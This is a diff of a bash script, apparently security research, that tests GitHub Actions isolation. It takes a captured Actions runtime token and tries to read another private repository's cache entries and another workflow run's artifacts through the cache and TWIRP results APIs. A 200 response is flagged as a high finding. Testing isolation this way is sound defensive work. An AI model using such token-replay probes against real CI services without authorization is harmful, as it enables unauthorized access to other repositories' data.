@@ -1,50 +1,53 @@
 #!/usr/bin/env bash
-# T1 oracle: use action-context runtime token against own & cross-repo resources.
+# T1 oracle FINAL: cache-service oracle with action-context token.
+# own  = cross-a-$GITHUB_RUN_ID seeded here (control)
+# cross= cross-b-1 seeded by private repo escape-lab-cross
 set -u
 TOK=$(cat reports/runtime-token.txt 2>/dev/null || true)
 if [ -z "$TOK" ]; then
-  echo "no runtime token in action context either -> isolation confirmed at all layers"
+  echo "no runtime token in action context -> isolation confirmed"
   exit 0
 fi
+CACHE_URL=$(python3 -c "import json;print(json.load(open('reports/action-env.json')).get('ACTIONS_CACHE_URL',''))" 2>/dev/null)
+RESULTS_URL=$(python3 -c "import json;print(json.load(open('reports/action-env.json')).get('ACTIONS_RESULTS_URL',''))" 2>/dev/null)
+echo "cache base host: $(echo "$CACHE_URL" | sed -E 's#(https://[^/]+/).*#\1#')"
+VER='deadbeef00000000000000000000000000000000000000000000000000000000'
+KEY_A="cross-a-${GITHUB_RUN_ID}"
+KEY_B='cross-b-1'
 
-RURL=$(python3 -c "
-import json
-try:
-    d = json.load(open('reports/action-env.json'))
-    print(d.get('ACTIONS_RESULTS_URL') or d.get('ACTIONS_RUNTIME_URL') or '')
-except Exception:
-    print('')
-")
-[ -n "$RURL" ] || RURL="https://results-receiver.actions.githubusercontent.com/"
-BASE="$RURL"; [[ "$BASE" == */ ]] || BASE="${BASE}/"
-echo "oracle base: $BASE"
+code() { curl -sS -m 20 -o /tmp/o.out -w "%{http_code}" -H "Authorization: Bearer $TOK" "$@" 2>/dev/null || echo 000; }
 
-echo "== JWT payload (scope analysis)"
-python3 - "$TOK" <<'EOF'
-import base64, json, sys
-try:
-    p = sys.argv[1].split('.')[1]
-    p += '=' * (-len(p) % 4)
-    print(json.dumps(json.loads(base64.urlsafe_b64decode(p)), indent=1, sort_keys=True))
-except Exception as e:
-    print('decode error:', e)
-EOF
+echo "== [own control] seed + get"
+BODY="{\"key\":\"$KEY_A\",\"version\":\"$VER\",\"size\":14}"
+C=$(code -X POST -H 'Content-Type: application/json' -d "$BODY" "${CACHE_URL}_apis/artifactcache/caches")
+echo "own reserve: $C"
+UP=$(python3 -c "import json;print(json.load(open('/tmp/o.out')).get('signedUploadUrl',''))" 2>/dev/null)
+CID=$(python3 -c "import json;print(json.load(open('/tmp/o.out')).get('cacheId',''))" 2>/dev/null)
+if [ -n "$UP" ]; then
+  printf 'own-seed-data-14' > /tmp/blob.bin
+  echo "own upload: $(curl -sS -m 20 -o /dev/null -w '%{http_code}' -X PUT -H 'x-ms-blob-type: BlockBlob' --upload-file /tmp/blob.bin "$UP")"
+  echo "own commit: $(curl -sS -m 20 -o /dev/null -w '%{http_code}' -X PATCH -H 'Content-Type: application/json' -d '{"size":14}' "${CACHE_URL}_apis/artifactcache/caches/$CID")"
+  sleep 3
+  C=$(code "${CACHE_URL}_apis/artifactcache/cache?keys=$KEY_A&version=$VER")
+  echo "GET own cache: $C"
+  head -c 200 /tmp/o.out; echo
+fi
 
-B_RUN_ID="${B_RUN_ID:-0}"
-for RID in "$GITHUB_RUN_ID" "$B_RUN_ID"; do
-  tag=$([ "$RID" = "$GITHUB_RUN_ID" ] && echo own || echo cross)
-  C=$(curl -sS -m 20 -o /tmp/o.out -w "%{http_code}" -H "Authorization: Bearer $TOK" \
-      "${BASE}_apis/pipelines/workflowruns/$RID/artifacts?api-version=6.0-preview" 2>/dev/null || echo 000)
-  echo "GET artifacts run=$RID ($tag): $C   <-- cross 200=HIGH FINDING"
-  head -c 300 /tmp/o.out; echo
-done
+echo "== [T1-cross] own token GET cross-repo cache"
+C=$(code "${CACHE_URL}_apis/artifactcache/cache?keys=$KEY_B&version=$VER")
+echo "GET cross cache key=$KEY_B: $C   <-- 404=isolated / 200=HIGH FINDING"
+head -c 250 /tmp/o.out; echo
 
-# cache service probe via results host (v4 backend)
-C=$(curl -sS -m 20 -o /tmp/o.out -w "%{http_code}" -X POST -H "Authorization: Bearer $TOK" \
-    -H 'Content-Type: application/json' -d '{}' \
-    "${BASE}_apis/artifactcache/caches" 2>/dev/null || echo 000)
-echo "cache reserve probe @results: $C"
-head -c 200 /tmp/o.out; echo
-
+echo "== [T1-cross] own token vs cross-repo TWIRP artifacts (results host)"
+if [ -n "$RESULTS_URL" ]; then
+  for RID in "$GITHUB_RUN_ID" "${B_RUN_ID:-0}"; do
+    tag=$([ "$RID" = "$GITHUB_RUN_ID" ] && echo own || echo cross)
+    C=$(code -X POST -H 'Content-Type: application/json' \
+        -d "{\"workflow_run_id\":$RID}" \
+        "${RESULTS_URL}twirp/github.actions.results.api.v1.ArtifactService/ListArtifacts" 2>/dev/null || echo 000)
+    echo "TWIRP ListArtifacts run=$RID ($tag): $C"
+    head -c 200 /tmp/o.out; echo
+  done
+fi
 rm -f reports/runtime-token.txt
-echo "ORACLE DONE (token file removed)"
+echo "ORACLE FINAL DONE (token file removed)"
